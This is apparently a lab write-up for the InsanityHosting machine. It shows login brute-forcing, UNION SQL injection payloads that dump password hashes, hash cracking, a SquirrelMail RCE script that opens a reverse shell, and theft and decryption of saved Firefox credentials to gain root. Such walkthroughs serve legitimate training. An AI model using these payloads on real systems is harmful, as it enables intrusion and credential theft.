# InsanityHosting

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.249.124
```

Open ports discovered:

- **21** — FTP (vsftpd 3.0.2)
- **22** — SSH (OpenSSH 7.4 (protocol 2.0))
- **80** — HTTP (Apache httpd 2.4.6 ((CentOS) PHP/7.2.33))
  - `http://192.168.249.124/monitoring/`
  - `http://192.168.249.124/data/`
  - `http://192.168.249.124/img/`
  - `http://192.168.249.124/fonts/`
  - `http://192.168.249.124/js/`
  - `http://192.168.249.124/news/`
    - Redirects to `http://www.insanityhosting.vm/`
    - Add `www.insanityhosting.vm` to `/etc/hosts`:

    ```
	192.168.249.124 www.insanityhosting.vm
    ```

  - `http://192.168.249.124/phpmyadmin/`
  - `http://192.168.249.124/phpinfo.php`
  - `http://192.168.249.124/webmail/`
  - `http://192.168.249.124/index.php`

Run `nmap` with version detection against all ports:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.249.124
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Port 21 allows anonymous FTP login.

Explore the FTP server:

```
ftp anonymous@192.168.249.124
ftp> ls -al
...
drwxr-xr-x    3 0        0              17 Aug 16  2020 .
drwxr-xr-x    3 0        0              17 Aug 16  2020 ..
drwxr-xr-x    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls -al
...
drwxr-xr-x    2 0        0               6 Apr 01  2020 .
drwxr-xr-x    3 0        0              17 Aug 16  2020 ..
226 Directory send OK.
```

The `pub` directory is empty — nothing of interest.

Browse to `http://192.168.249.124/` — the page contains a mention of the email address `hello@insanityhosting.vm`.

Browse to `http://192.168.249.124/monitoring/` — the page redirects to `http://192.168.249.124/monitoring/login.php` and requires login credentials.

Run `feroxbuster` on the monitoring directory:

```
feroxbuster -u http://192.168.249.124/monitoring/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 --depth 4
```

The scan reveals standard application directories (`images/`, `js/`, `templates/`, `assets/`, `vendor/`, `fonts/`, `templates_c/`, `css/`, `class/`, `smarty/`, `settings/`) with no interesting findings.

Run `whatweb` against the monitoring application:

```
whatweb -a 3 -v http://192.168.249.124/monitoring/
```

The `login.php` page is identified as running Apache 2.4.6, Bootstrap, HTML5, jQuery 3.2.1, and PHP 7.2.33 with the title "Insanity Hosting » Monitoring".

Browse to `http://192.168.249.124/data/` — the directory contains `EMPTY` and `VERSION` files, both containing the string `1.14.0`.

Browse to `http://www.insanityhosting.vm/news/` — the page is powered by Bludit CMS and mentions a team leader named Otis (possible username `otis`). The email `hello@insanityhosting.vm` is also referenced.

Run `feroxbuster` on the news directory:

```
feroxbuster -u http://www.insanityhosting.vm/news/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 --depth 4
```

Results include `http://www.insanityhosting.vm/news/install.php` (Bludit is already installed), `http://www.insanityhosting.vm/news/robots.txt` (no new directories), and `http://www.insanityhosting.vm/news/admin/` (requires login).

Run `whatweb` on the news page:

```
whatweb http://www.insanityhosting.vm/news/
```

The CMS is confirmed as Bludit running on Apache 2.4.6 with PHP 7.2.33.

Browse to `http://192.168.249.124/phpmyadmin/` — logged in as `administrator:` but phpMyAdmin 5.0.2 only contains the `information_schema` database with no useful data, suggesting this is not a privileged account.

Browse to `http://192.168.249.124/phpinfo.php` — nothing of interest.

Browse to `http://192.168.249.124/webmail/` — the page redirects to `http://192.168.249.124/webmail/src/login.php` and requires login.

Browse to `http://192.168.249.124/index.php` — the response includes a "Missing version directory" notice.

Use Burp Suite Intruder to brute-force the monitoring application login at `http://192.168.249.124/monitoring/login.php` with the username `otis` and the wordlist `/usr/share/wordlists/rockyou.txt`. Filter the results by the `Location` HTTP header — successful logins redirect to `index.php`, while failed attempts redirect to `login.php`.

The credentials `otis:123456` are obtained.

Login as `otis` at `http://192.168.249.124/monitoring/` using `otis:123456`. The dashboard displays monitored servers with the message: "Below are the servers you have set to monitor. If a server is down, we will e-mail you a notification along with a report of the downtime."

Add a new server to monitor, pointing to an IP address with no endpoint (an empty IP address works). The application runs a monitoring check every minute and sends email reports.

Attempt to login through SSH as `otis` using `otis:123456` — the connection is rejected.

Attempt to login through FTP as `otis` using `otis:123456` — authentication fails.

Attempt to login at `http://www.insanityhosting.vm/news/admin/` as `otis` using `otis:123456` — authentication fails.

Attempt to login at `http://192.168.249.124/phpmyadmin/index.php` as `otis` using `otis:123456` — authentication fails.

Login as `otis` at `http://192.168.249.124/webmail/src/login.php` using `otis:123456`. Emails are received from `monitor@lab-pg-centos7-insanityhosting-245-199.novalocal` about downed servers, containing a table with columns: ID, Host, Date Time, Status.

Test the server name field in the monitoring dashboard for SQL injection. Entering `' OR 1=1 -- ` produces output but the string is escaped with double-quotations:

```
' OR 1=1 --  is down. Please check the report below for more information.<br><br>ID, Host, Date Time, Status<br>189,"' OR 1=1 -- ","2026-11-07 16:24:01",0<br>191,"' OR 1=1 -- ","2026-11-07 16:25:01",0
```

Entering `" OR 1=1 -- ` bypasses the escaping and reveals all server entries in the database, confirming a UNION-based SQL injection vulnerability.

Perform further SQL injection enumeration using the `" UNION SELECT ... -- ` payload:

```
# Get SQL version
" UNION SELECT @@version, null, null, null --
# --> 5.5.65-MariaDB

# Get database names
" UNION SELECT schema_name, null, null, null FROM information_schema.schemata --
# Useful databases: monitoring, mysql

# Get tables within the monitoring database
" UNION SELECT table_name, null, null, null FROM information_schema.tables WHERE table_schema = 'monitoring' --
# Tables: hosts, log, users

# Get column names within the users table
" UNION SELECT column_name, null, null, null FROM information_schema.columns WHERE table_name = 'users' --
# Columns: id, username, password, email

# Get usernames and passwords from the users table
" UNION SELECT username, password, null, null FROM users --
```

Three bcrypt hashes are obtained:

- `admin:$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma`
- `nicholas:$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe`
- `otis:$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW`

Crack the bcrypt hashes with hashcat using mode 3200 (bcrypt $2*$, Blowfish):

```
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
...
$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW:123456
```

Only `otis:123456` is cracked — the admin and nicholas hashes do not fall to the wordlist.

Continue SQL injection enumeration to access the `mysql` database, since the application appears to connect with elevated privileges:

```
# Get tables within the mysql database
" UNION SELECT table_name, null, null, null FROM information_schema.tables WHERE table_schema = 'mysql' --
# Useful table: user

# Get column names within the user table
" UNION SELECT column_name, null, null, null FROM information_schema.columns WHERE table_name = 'user' --
# Useful columns: User, Password, authentication_string

# Get usernames, passwords and authentication strings from mysql.user
" UNION SELECT User, Password, authentication_string, null FROM mysql.user --
```

Additional credentials are obtained from the MySQL user table:

- `root:*CDA244FF510B063DA17DFF84FF39BA0849F7920F` (MySQL native password hash)
- `elliot:*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9` (MySQL native password hash)

Crack the MySQL hashes with hashcat using mode 300 (MySQL4.1/MySQL5):

```
hashcat -m 300 hash2.txt /usr/share/wordlists/rockyou.txt
...
5a5749f309cac33b27ba94ee02168fa3c3e7a3e9:elliot123
```

The hash for `elliot` is cracked: `elliot:elliot123`. The root MySQL hash cannot be cracked.

Login through SSH as `elliot`:

```
ssh elliot@192.168.249.124
elliot@192.168.249.124's password: elliot123

[elliot@lab-pg-centos7-insanityhosting-245-199 ~]$ whoami
elliot
```

Retrieve the `local.txt` flag:

```
[elliot@lab-pg-centos7-insanityhosting-245-199 ~]$ cat local.txt
0c5e9920de44c7b5c392b5c1efe94dea
```

### Alternative Initial Access — SquirrelMail RCE (CVE-2017-7692)

SquirrelMail 1.4.22 is vulnerable to remote code execution via a sendmail configuration file injection (CVE-2017-7692). The vulnerability exists in `Deliver_SendMail.class.php`, where `escapeshellcmd()` fails to properly escape whitespaces in the `-f$envelopefrom` parameter, allowing an attacker to inject arbitrary sendmail command-line parameters. Exploitation requires uploading a malicious `sendmail.cf` file as an email attachment and injecting the `-C` option via the "Options > Personal Informations > Email Address" setting.

The exploit script at [Exploit-DB 41910](https://www.exploit-db.com/exploits/41910) automates the attack. With valid SquirrelMail credentials for `otis` (obtained from the monitoring app brute-force), the script uploads a malicious sendmail configuration, injects the payload, and triggers execution by sending an email. Payload option 2 delivers a reverse shell:

```
bash 41910.sh http://192.168.249.124/webmail/
[*] Enter SquirrelMail user credentials
user: otis
pass: 123456
[*] Logging in to SquirrelMail at http://192.168.249.124/webmail/
[*] Uploading Sendmail config
[?] Select payload
1 - File write (into /tmp/sqpoc)
2 - Remote Code Execution (with the uploaded smcnf-exp + phpsh)
[1-2] 2
Reverse shell IP: <attacker_ip>
Reverse shell PORT: <attacker_port>
```

Credit: [HackIndex — InsanityHosting Writeup](https://hackindex.io/writeups/insanityhosting)

### Alternative Initial Access — Hydra brute-force SquirrelMail

Instead of using Burp Suite, the SquirrelMail login at `http://192.168.249.124/webmail/src/redirect.php` can be brute-forced directly with Hydra using the discovered username `otis`:

```
hydra -l otis -P /usr/share/wordlists/rockyou.txt "http-post-form://192.168.249.124/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
```

This yields the same credentials `otis:123456`, which can then be used to access the monitoring dashboard and proceed with the SQL injection attack vector.

Credit: [RicePancakes — VulnHub Insanity 1](https://catsandpancakes.github.io/2020/09/23/vulnhub-insanity-1.html)

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189

# Target
www-data@lab-pg-centos7-insanityhosting-245-199:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-centos7-insanityhosting-245-199:/tmp$ wget http://192.168.45.189:9001/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-centos7-insanityhosting-245-199:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-centos7-insanityhosting-245-199:/tmp$ ./linpeas.sh
```

Important findings:

```
╔══════════╣ PATH (T1574.007)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#writable-path-abuses
/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/elliot/.local/bin:/home/elliot/bin
...
Files with capabilities (limited to 50):
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
...
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#writable-files
...
	/opt/remi/php72/root/tmp
```

The results do not immediately reveal a clear privilege escalation path.

Monitor for hidden processes using `pspy64`:

```
# Host
scp linux/enum/pspy64 elliot@192.168.249.124:/tmp
elliot@192.168.249.124's password: elliot123

# Target
[elliot@lab-pg-centos7-insanityhosting-245-199 tmp]$ ./pspy64
...
2026/11/08 06:09:01 CMD: UID=0     PID=26856  | /usr/sbin/crond -n
2026/11/08 06:09:01 CMD: UID=1004  PID=26860  | /usr/bin/php -q /var/www/html/monitoring/cron.php
2026/11/08 06:09:01 CMD: UID=0     PID=26861  | sendmail: accepting connections
2026/11/08 06:09:01 CMD: UID=1001  PID=26869  | procmail -f monitor@lab-pg-centos7-insanityhosting-245-199.novalocal -t -Y -a  -d otis
2026/11/08 06:10:01 CMD: UID=1004  PID=26935  | /usr/bin/php -q /var/www/html/monitoring/cron.php
2026/11/08 06:10:01 CMD: UID=1004  PID=26934  | /usr/sbin/sendmail -FCronDaemon -i -odi -oem -oi -t -f monitor
```

A cron job runs `/usr/bin/php -q /var/www/html/monitoring/cron.php` as UID 1004 (elliot) and triggers sendmail/procmail operations. The root-level cron entries appear to be part of the monitoring application's normal email notification behavior.

Explore the home directory at `/home/elliot/`:

```
[elliot@lab-pg-centos7-insanityhosting-245-199 ~]$ ls -al
total 16
drwx------. 4 elliot elliot 128 Dec 15  2020 .
drwxr-xr-x. 8 root   root    90 Nov  8 05:25 ..
lrwxrwxrwx. 1 root   root     9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--. 1 elliot elliot  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 elliot elliot 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 elliot elliot 231 Apr  1  2020 .bashrc
-rw-r--r--  1 elliot elliot  33 Nov  8 05:26 local.txt
drwx------. 5 elliot elliot  66 Aug 16  2020 .mozilla
drwx------. 2 elliot elliot  25 Aug 16  2020 .ssh
```

The hidden directory `.mozilla` contains a Firefox profile that may store saved credentials.

Explore the Firefox profile directory:

```
[elliot@lab-pg-centos7-insanityhosting-245-199 ~]$ cd /home/elliot/.mozilla/firefox

[elliot@lab-pg-centos7-insanityhosting-245-199 firefox]$ ls -al
total 12
drwx------. 4 elliot elliot  102 Aug 16  2020 .
drwx------. 5 elliot elliot   66 Aug 16  2020 ..
drwx------. 8 elliot elliot 4096 Nov  8 05:51 esmhp32w.default-default
-rw-rw-r--. 1 elliot elliot   62 Aug  16  2020 installs.ini
-rw-rw-r--. 1 elliot elliot  259 Aug 16  2020 profiles.ini
drwx------. 2 elliot elliot   24 Aug 16  2020 wqqe31s0.default
```

The profile `esmhp32w.default-default` contains `logins.json` (encrypted stored usernames and passwords) and `key4.db` (the NSS security database managing encryption keys).

Download `firefox_decrypt` from [github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt) and install it on the attacking machine.

Pull the Firefox profile back to the attacking machine:

```
scp -r elliot@192.168.249.124:/home/elliot/.mozilla .
elliot@192.168.249.124's password: elliot123
```

Decrypt the saved Firefox credentials:

```
python3 firefox_decrypt.py /home/kali/OSCP/.mozilla/firefox
Select the Mozilla profile you wish to decrypt
1 -> wqqe31s0.default
2 -> esmhp32w.default-default
2

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
```

Elliot saved root credentials for a local service on port 10000 (Webmin) in Firefox. Use the password directly with `su`:

```
[elliot@lab-pg-centos7-insanityhosting-245-199 esmhp32w.default-default]$ su root
Password: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa

[root@lab-pg-centos7-insanityhosting-245-199 esmhp32w.default-default]# whoami
root
```

Retrieve the `proof.txt` flag:

```
[root@lab-pg-centos7-insanityhosting-245-199 esmhp32w.default-default]# cd /root
[root@lab-pg-centos7-insanityhosting-245-199 ~]# cat proof.txt
c8b1f2a7020a4230d1626e727a6df4ca
```
